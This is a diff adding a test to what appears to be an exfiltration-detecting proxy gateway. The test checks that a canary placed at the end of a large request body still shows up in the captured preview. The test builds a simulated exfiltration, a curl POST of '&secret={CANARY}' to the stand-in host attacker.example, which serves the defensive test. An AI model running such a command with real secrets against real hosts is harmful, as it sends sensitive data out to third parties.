@@ -240,3 +240,14 @@ def test_the_gateway_refuses_to_start_without_a_sinkhole(tmp_path):
     )
     assert blocked.returncode != 0
     assert "sinkhole is not up" in blocked.stdout + blocked.stderr
+
+
+def test_a_canary_at_the_end_of_a_large_body_is_captured(gateway):
+    # Guards the readexactly body read: read() returns on the first segment, so
+    # a canary near the end of a multi-KB body could be truncated out of the
+    # preview and canary_exfil would miss it.
+    out, _ = gateway
+    padding = "x" * 3000
+    body = f"{padding}&secret={CANARY}"
+    _curl("-x", PROXY, "-d", body, "http://attacker.example/collect")
+    assert CANARY in _last(out)["body_preview"]
